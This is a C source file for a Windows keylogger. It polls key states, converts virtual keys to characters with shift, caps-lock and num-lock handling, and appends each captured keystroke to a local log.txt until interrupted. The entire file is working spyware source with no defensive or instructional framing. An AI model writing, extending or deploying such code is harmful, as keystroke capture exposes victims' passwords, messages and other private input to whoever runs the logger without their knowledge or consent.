#include <stdio.h>
#include <stdlib.h>
#include <winuser.h>
#include <signal.h>

FILE* fptr;

void close_logger(int signal) {
    if (fptr != NULL) {
        fclose(fptr);
        printf("logger stopped...");
    }
    exit(signal);
}

void key_logger() {
    int vkey;
    int last_vkey[0xFF];
    char key;
    char chars_num[] = ")!@#$%^&*(";
    char chars_vn[] = ";=,-./`";
    char chars_vs[] = ":+<_>?~";
    char chars_va[] = "[\\]\';";
    char chars_vb[] = "{|}\"";
    
    fptr = fopen("log.txt", "a"); 
    for (vkey = 0; vkey < 0xFF; vkey++)
        last_vkey[vkey] = 0;
    
    signal(SIGINT, close_logger);

    while (1) {
        // check if either shift, caps lock, or num lock is pressed
        int SHIFT = (GetAsyncKeyState(VK_SHIFT) & 0x8000) > 0 ? 1 : 0;
        int CAPSLOCK = GetKeyState(VK_CAPITAL) > 0 ? 1 : 0;
        int NUMLOCK = GetKeyState(VK_NUMLOCK) > 0 ? 1 : 0;

        for (vkey = 0; vkey < 0xFF; vkey++) {
            int pressed = (GetKeyState(vkey) & 0xFF00) > 0 ? 1 : 0;
            key = (char)vkey;

            if (pressed == 1 && last_vkey[vkey] == 0) {
                // uppercase -> lowercase if neither shift or caps or both shift and caps
                if ((vkey >= 0x41 && vkey <= 0x5A))
                    key = (char)((SHIFT == CAPSLOCK) ? vkey + 0x20 : vkey);
                
                // number -> special characters if shift
                else if (vkey >= 0x30 && vkey <= 0x39)
                    key = (SHIFT) ? chars_num[vkey - 0x30] : key;
                
                // keypad -> number if numlock
                else if (vkey >= 0x60 && vkey <= 0x69 && NUMLOCK)
                    key = (char)(vkey - 0x30);
                
                // special characters -> alternate if shift
                else if (vkey >= 0xBA && vkey <= 0xC0)
                    key = (SHIFT) ? chars_vs[vkey - 0xBA] : chars_vn[vkey - 0xBA];
                
                // special characters -> alternate if shift
                else if (vkey >= 0xDB && vkey <= 0xDF)
                    key = (SHIFT) ? chars_vb[vkey - 0xDB] : chars_va[vkey - 0xDB];
                
                // carriage return -> newline
                else if (vkey == 0x0D)
                    key = (char)0x0A;
                
                // ignore non-printable and other special keys
                else if ((vkey >= 0x6A && vkey <= 0x6F) || (vkey != 0x20 && vkey != 0x99))
                    key = (char)0x00;
                
                // open the key log file, write the captured key, and close the file
                if (key != (char)0x00)
                    putc(key, fptr);
            }
            last_vkey[vkey] = pressed;
        } 
    }
    return;
}

int main() {
    printf("logger started...\n");
    key_logger();
    return 0;
} 
